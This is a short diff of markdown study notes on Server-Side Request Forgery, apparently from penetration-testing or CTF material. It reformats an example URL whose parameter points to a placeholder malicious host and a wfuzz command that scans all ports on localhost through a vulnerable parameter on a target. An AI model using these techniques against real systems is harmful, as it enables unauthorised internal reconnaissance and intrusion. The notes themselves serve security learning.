@@ -1,4 +1,6 @@
-# Types:
+# Server-Side Request Forgery (SSRF)
+
+## Types:
 
 ### 1: Regular
 
@@ -6,7 +8,9 @@
 
 # Locations:
 
-### 1: When a full URL is used in a parameter in the address bar (https://site.com/form?server=http://evilsite.com/malware)
+### 1: When a full URL is used in a parameter in the address bar 
+
+    https://site.com/form?server=http://evilsite.com/malware
 
 ### 2: A hidden field in a form (View page source)
 
@@ -28,7 +32,7 @@
 
 ## WFUZZ
 
-#### wfuzz -c -z range,1-65535 http://TARGET_IP/url.php?path=127.0.0.1:FUZZ
+    wfuzz -c -z range,1-65535 http://TARGET_IP/url.php?path=127.0.0.1:FUZZ
 
 ## Burpsuite
 
